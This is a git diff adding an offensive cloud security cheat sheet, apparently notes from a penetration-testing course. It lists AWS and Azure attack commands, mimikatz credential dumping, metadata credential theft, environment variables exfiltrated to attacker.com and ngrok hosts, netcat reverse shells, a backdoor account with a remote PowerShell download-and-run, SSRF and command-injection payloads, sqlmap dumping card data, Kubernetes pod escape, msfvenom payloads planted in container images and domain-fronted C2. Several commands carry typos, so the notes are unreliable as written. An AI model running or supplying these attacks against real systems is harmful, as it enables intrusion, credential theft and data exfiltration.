@@ -1,0 +1,366 @@
+# AWS CLI
+aws help
+aws s3 help
+aws s3api help
+aws configure --profile NAME
+aws s3 ls --profile PROFILE  # バケット一覧
+aws s3 ls BUCKET --profile PROFILE # オブジェクト一覧
+aws s3 cp s3://bucket/file /tmp/file --profile PROFILE
+aws s3 rb BUCKET  # バケット削除
+aws s3 rm s3://bucket/example/file  # オブジェクト削除
+aws ec2 list-instances --profile PROFILE
+aws ec2 describe-instances --profile PROFILE
+aws ec2 run-instances --image-id IMAGEID --subnet-id SUBNETID --security-group-ids IDS --key-name KEYNAME --profile PROFILE
+
+aws ec2 describe-instances --profile PROFILE | jq '
+.Reservations[] | .Instances[] | .InstanceType' | sort -u
+#=>
+"t2.small"
+"t3.medium"
+
+
+# files
+/home/user/.aws/config
+/home/user/.aws/credentials
+
+# policies evaluation logic
+Explicit Deny? =Yes> Deny
+Orfaniczations SCP has Allow? =No> Deny
+Resource-based policy has Allow? =Yes> Allow
+Permission boundary has Allow? =No> Deny
+Session policy has Allow? =No> Deny
+identity-based policy has Allow? =No> Deny
+Allow
+#https://docs.aws.amazon.com/ja_jp/IAM/latest/UserGuide/reference_policies_evaluation-logic.html
+
+
+# Azure CLI
+az configure
+az vm list -o table
+az ad sp create-for-rbac --name sec588-class --create-cert
+az login --service-principal -u http://sec588-class/ -p ~/cert.pem --tenant XxxXXXXX
+az vm list --query "[?storageProfile.osDisk.osType=='Linux'].{Name:name,admin:osProfile.adminUsername}" --output table
+
+# Azure File Share
+STORAGEACCOUNT.files.core.windows.net
+STORAGEACCOUNT.files.core.windows.net/CONTAINER
+STORAGEACCOUNT.files.core.windows.net/CONTAINER/?comp=list
+
+# shimit.py
+https://github.com/cyberark/shimit
+python ./shimit.py -idp http://adfs.lab.local/adfs/services/trust -pk key_file -k cert_file -u domain\admin -n admin@domain.com -r ADFS-admin -r ADFS-monitor -id 123456789012
+#b2-p109
+
+# mimikatz
+lsadump::sam
+crypto::certificates /systemstore:local_machine
+sekurlsa::cloudap
+
+# Microsoft Graph API
+
+## search emails
+POST https://graph.microsoft.com/beta/search/query
+Content-Type: application/json
+{
+    "requests": [{
+        "entityTypes": [ "microsoft.graph.message" ],
+        "query": {
+            "query_string":{
+                "query": "password"
+            }
+        },
+        "from": 0,
+        "size": 25
+    }]
+}
+
+## search for documents
+GET /drives/{drive-id}/root/search(q='{search-text}')
+GET /groups/{group-id}/drive/root/search(q='{search-text}')
+GET /me/drive/root/search(q='{search-text}')
+GET /sites/{site-id}/drive/root/search(q='{search-text}')
+GET /users/{user-id}/drive/root/searc(q='{search-text}')
+
+# AWS metadata
+http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLENAME
+
+TOKEN=`curl -X PUT http://169.254.169.254/latest/api/token \
+  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"` \
+&& curl -H "X-aws-ec2-metadata-token: $TOKEN" \
+  -v http://169.2541.69.254/latest/metadata
+
+# socat
+socat -d -d tcp4-listen:8080,reuseaddr,fork TCP4:1.2.3.4:80
+socat openssl-listen:8443,reuseaddr,cert=cert.pem,verify=0,fork stdio
+socat -u FILE:exfil.dat TCP-LISTEN:1234,reuseaddr
+socat -u TCP:1.2.3.4:1234 OPEN:exfil.dat,create,trunc
+
+# iptables
+iptables -t nat -A PREROUTING -p tcp -dport 1234 -j DNAT --to-destination 1.2.3.4:8080
+
+# portproxy
+netsh interface portproxy add v4tov4 listenport=1234, connectport=8080 connectaddress=1.2.3.4
+netsh interface portproxy show all
+
+# AWS user-data
+https://169.254.169.254/latest/user-data
+
+```
+#!/bin/bash
+set -ex
+B64_CLUSTER_CA=LpNKQo=
+API_SERVER_URL=https://fdafsaf.com/
+K8S_CLUSTER_DNS_IP=172.20.0.10
+/etc/eks/botstrap.sh SETUP_STRING
+```
+
+# Amazon KMS
+aws kms encrypt --key-id KEYID, --plaintext fileb://plaintext-file --query CiphertextBlog --output text | base64 -d | base64 -w 76 > ciphertext-datat.txt
+aws kms decrypt --ciphertext-blob fileb://<(cat ciphertext-data.txt | base64 -d) --output text --query Plaintext | base64 -d > decrypted-file.txt
+
+# Pacu
+ls  # list modules
+help
+run MODULENAME --region us-east-1,us-west-1
+service__module_name
+
+# Azure
+az vm list -o yaml -d   # Lists all vms
+az snapshot create --resource-group sec588 --name sec588-snap --source dc1-class
+az vm create --resouce-group sec588 --name sec588-newdc --image sec588-snap
+az vm open-port -g sec588 -n sec588-vm --port 3389 --priority 100
+
+# dism
+DISM.exe
+ /Append-Image
+ /ImageFile:IMAGE_FILE_PATH
+ /CaptureDir:SOURCE_DIR
+ /Name:IMAGE_NAME
+ [/Descriptino:IMAGE_DESC]
+ [/ConfigFile:CONFIG_FILE.INI]
+ [/Bootable]
+ /WIMBoot
+ [/BheckIntegrity]
+ [/Verify]
+ [/NoRpFix]
+
+# Azure Custom Script Extension
+Set-AzVMCustomScriptExtension
+  -ResourceGroupName RESOURCE_GROUP_NAME
+  -VMName VMNAME
+  -Location MYLOCATION
+  -FileUri FILEURL
+  -Run myScript.ps1
+  -Name DemoScriptExtension
+
+# Azure RunCommand
+az vm run-command invoke
+  --command-id RunPowerShellScript
+  --name win-vm
+  -g my-resource-group
+  --scripts @script.ps1
+  --parameters "arg1=somefoo" "arg2=somebar"
+
+# Azure Watcher Tasks
+net user backdoor Password123 /add
+(New-Object Net.WebClient).Proxy.Credentials=[
+    Net.CredentialCache
+]::DefaultNetworkCredentials;
+iwr('http://attacker/payload.ps1')|iex
+
+# WinRM
+Set-Item wsman:\localhost\client\trustedhosts *
+Restart-Service WinRM
+Invoke-Command -ComputerName 1.2.3.4 -ScriptBlock {
+    Get-ChildItem C:\
+} - credential admin
+Enter-PSSession -ComputerName 1.2.3.4 -Credential admin
+
+# CI/CD
+ENV=`env | base64`
+curl https://attacker.com/$ENV
+curl -X POST -k https://attacker.com/ --data "$ENV"
+
+curl http://github.com/<repo>/netcat -o /usr/bin/nc
+nc 123abc.ngrok.io 1234 -e /bin/bash &
+
+export STUFF=`env`; nc -w 5 123abc.ngrok.io 1234 < $STUFF
+export STUFF=`env`; curl -X POST http://123abc.ngrok.io:1234 --data $STUFF
+
+curl https://raw.githubusercontent.com/mosesrenegade/tools-repo/mater/statically-compiled/nc -o /usr/local/bin/nc
+chmod a+x /usr/local/bin/nc
+/usr/local/bin/nc 123abc.ngrok.io -e /bin/bash &
+
+# SSRF
+http://app.domain.sec588.net/index?picture=http://bucket.sec588.net/logo.png
+http://app.domain.sec588.net/index?picture=http://my.site.inclusion/otheritem.png
+http://app.domain.sec588.net/index?picture=logo.png&%0d%0apicture=http://y.site.inclusion/otheritem.png
+?url=http://169.254.169.254/latest/meta-data/iam/security-credentials
+
+# Metadata v2
+TOKEN=`curl -X PUT "http://169.254.169.254/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"`
+curl -H "X-aws-ec2-metadata-token: $TOKEN" -v http://169.254.169.254/latest/meta-data/iam/security-credentials
+
+# Command injection
+http://app.domain.sec588.net/index?ping=127.0.0.1%26%26dir
+%26 => &
+env
+putenv
+echo $ENV
+ls /var/run/secrets/kubernates.io/
+mount
+
+# set of binaries - windows
+%26%6cmd.exe+/k+dir+C:\
+%26%26cmd.exe+/k+set
+%26%26+set
+
+# set of binaries - linux
+/bin/id
+/bin/env
+/bin/uname
+
+# Amazon Lambda
+aws lambda invoke --function-name FUNCNAME OUTFILE
+aws lambda invoke --function-name FUNCNAME --payload VALUE
+/vulnerable/api/call?e=require("child_process").exec("ping -c 4 atacker.ip.com")
+
+var child_process = require('child_process')
+exports.handle = function(e, ctx, db){
+    child_process.exec(e.command, {
+        maxBuffer: 1024*1024*512
+    }, (err, stdout, stderr) => {
+        cb(err, stdout)
+    })
+}
+aws lambda invoke --function NAME --payload '{"command": "ls"}' response.json
+
+# Cloud Databases
+mongo --host HOST --port PORT
+nmap -p 27001 --script=mongodb-databases IP
+redis-ci -h ip
+nmap -p 6379 --script=redis-info IP
+echo -e "*1\r\n$4\r\nINFO\r\n" | nc IP PORT
+
+# MongoDB
+show dbs
+user wizards
+use wizards
+show collections
+db.wizards.findOne()
+db.wizards.find().prettyPrint()
+db.wizards.findOne({lastName:{$gt:'D'}})
+
+# SQLmap
+sqlmap.py -r /workdir/request --ramdom-agent --dbs
+sqlmap.py -r /workdir/request --method=PUT --random-agent --dbs
+sqlmap.py -r /workdir/request --method=PUT --random-agent -D Prod -T CreditCard --first
+
+cat /workdir/request
+POST /vuln.php HTTP/1.1
+Host: www.target.com
+User-Agent: Mozilla/4.0
+
+{"id":"1"}
+
+# Kubernetes
+/var/run/secrets/kubernetes.io,
+$HOME/.kube/config
+export KUBECONFIG=/home/USER/.kube/config:\
+  /home/USER/.kube/anotherconfig/config:\
+  /home/USER/.kube/yetanother/config
+/var/run/secrets/kubernetes/io/<USER or ROLE>/{token,namespace,ca.crt}
+kubectl apply -f privilege-pod.yaml
+kubectl exec -ti privileged-<random> chroot /host
+kubectl exec -ti privileged-<random> /bin/sh
+kubectl get secret mysecret -o yaml
+
+# AutoSSH
+authssh -M 0 -o 'ServerAliveInterval 30' -o 'ServerAliveCountMax 3' -L 5000:victim:445 attacker@attacker2.com
+-M 0 : disable monitoring
+
+# Metasploit
+msf5> use expoloits/<SelectOS>/<SelectExploit>
+msf5> set PALOAD <OS>/<Payload>/<Direction>
+msf5> use exploit/multi/handler
+msf5> set PAYLOAD windows/x64/reverse_http
+msf5> use exploit/multi/handler
+msf5> set PAYLOAD windows/x64/meterpreter/reverse_http # Staged, OR
+msf5> set PAYLOAD windows/x64/meterprete_reverse_http  # Stageless
+
+./msfvenom -p linux/meterpreter_reverse_https LHOST=IP, LPORT=PORT -f <exe/elf/etc> -o /file/location
+
+./msfvenom -p linux/meterpreter_reverse_https LHOST=my.ngrok.io LPORT=443 -f elf -o /container/build
+COPY /container/build /var/run/build
+WORKDIR /var/run
+CMD ["/var/run/build"]
+docker build -t ecr-account-name.ecr.amazonaws.com/wonedit .
+docker push -t ecr-account-name.ecr.amazonaws.com/ownedit
+
+# compiles binaries
+gcc -o nc nc.o -static -lbaz -lbar
+curl http://attacker.url/nc -o /bin/nc
+chmod +x /bin/nc
+apt install gcc-multilib
+
+# C2
+Server: <?php $authorization = "Bearere 080042.."
+Client # curl -x POST -H "Authorization : Bearer 080042..." http://www.example.com
+
+# copy in S3
+aws s3 sync s3://examplesourcebucket/* s3://exampledestinationbucket/*
+
+# CeWL
+cewl.rb -m 8 -e http://target.org -w /tmp/wordlist.txt
+-m 8: minimum eight characters long
+-e : email
+
+# Hydra
+./hyrda -L /tmp/usernames -P passwords.txt attack.site http-post-form
+  "login:username=^USER^&password=^PASS^&Login=Login:F=Login Failed:H=Host: attack.site"
+-L: Usernames
+-P: Passwords
+":F=Login failed" indicate fail
+":H=Host: attack.site" indicate success
+
+# pw-inspector
+pw-inspector -i /tmp/inputfile -o /tmp/smalleroutput -m 8 -M 32 -c 3 -u -l -n -s
+-i : input file
+-o : output file
+-m : Minimum character set
+-M : Maximum character set
+-c : minimum number of sets
+-p : printable characters
+-u : upper case
+-l : lower case
+-n : numbers
+-s : special characters
+
+# Domainhunter
+
+search last 1,000 expired domains
+domainhunter.py -r 1000
+
+check common content filter databases
+domainhunter.py -s evilcorp.com
+
+take keyworkd and check reputation(25 results)
+domainhunter.py -k dog - -r 25
+
+# Domain Fronting Payload
+msfvenom -p windows/meterpreter/reverse_https
+  LHOST=www.stackoverflow.com
+  LPORT=443
+  HttpHostHeader=actualsize.fastly.com
+  -f exe -o /tmp/payload
+
+# Certificates in Metasploit
+cd /etc/letsencrypt/live/attackerc2.com
+cat privkey.pem fullchain.pem > /opt/metasploit-framework/MSF.pem
+msf5> use exploit/multi/handler
+msf5> set payload windows/meterpreter/reverse_https
+msf5> set LHOST www.stackoverflow.com
+msf5> set LPORT 443
+msf5> set HttpHostHeader attackerc2.com
+msf5> set HandlerSSLCert /opt/metasploit-framework/MSF.pem
+msf5> set OverrideRequestHost true
